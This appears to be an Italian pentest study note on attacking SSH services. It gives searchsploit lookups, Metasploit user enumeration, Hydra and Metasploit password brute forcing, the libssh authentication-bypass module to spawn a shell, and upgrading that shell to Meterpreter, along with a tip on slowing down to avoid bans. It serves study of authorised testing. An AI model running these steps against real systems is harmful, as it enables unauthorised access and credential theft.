<a href="https://github.com/Gigidotexe/Penetration_Test_notes/blob/main/README.md"> Back </a>
## Ricerca Exploit noti
Dopo aver effettuata la scansione del servizio e la sua versione nella fase di Scansione ed Enumerazione, possiamo procedere con la ricerca di exploit noti usando <a href="https://www.exploit-db.com/">Ecploit Database</a> oppure: 
```bash
searchsploit <ssh-versione> 
```
> Se restituise un exploit utilizzabile, copia il path e usa `searchsploit -m <path>`

---
## Enumerazione degli utenti
Prima di porcedere con un attacco bruteforce, possiamo tentare di enumerare gli utenti con un modulo di Metasploit che enumera utenti sulla base del timing delle risposte e generalmente trova più utenti rispetto al bruteforce
```bash
use auxiliary/scanner/ssh/ssh_enumusers
```

---

## Bruteforce
Possiamo ora tentare di trovare delle credenziali usando il bruteforce
### Hydra
```bash
hydra -L <usernameList> -P <passwordList> -t 4 <IP> ssh
```
- `-L`: file con la lista degli username
- `-P`: file con la lista delle password
- `-t 4`: numero di thread simultanei

### Metasploit
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <IP>
set USERNAME <username>
set PASS_FILE <path_wordlist>
run
```
> **Nota:** usa velocità ridotte per evitare blocchi o ban da parte del sistema target.

---

## Accesso 
Dopo aver trovato una coppia di credenziali valide, possiamo passare alla fase di accesso. 
```bash
ssh <username>@<IP>
```
Alla prima connessione comparirà:
```bash
Are you sure you want to continue connecting (yes/no)?
```
Rispondi `yes`, poi inserisci la password.
> **Curiosità:** alcuni utenti SSH possono avere accesso root o sudo senza password in ambienti mal configurati.

---

## Altri exploit
Se il target esegue una versione di `libssh v0.6.0-0.8.0` possiamo usare il modulo
```bash
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS <IP>
set SPAWN_PTY true
run
```
> `SPAWN_PTY` se impostato a `true` consentirà di genereare una sessione terminale

Questo modulo ci aprirà una sessione con un terminale visualizzabile con `sessions`
```bash
id  name  type  information
--  ----  ----  -----------
1         shell  libssh Autentication Bypass Scanner
```
utilizzabile con il comando `sessions -i 1`. <br>
possiamo anche upgradare la shell in una shell meterpeter usando il comando
```bash
sessions -u 1 
```
oppure usando il modulo 
```bash
use post/multi/menage/shell_to_meterpeter
set LHOST <IP>
set SESSION 1
run
```
per poi aprire la sessione con `sessions -i 2` <br>
`2` é il codice della nuova sessione creata.
> potrebbe generare un errore a schermo, puoi ignorarlo

---
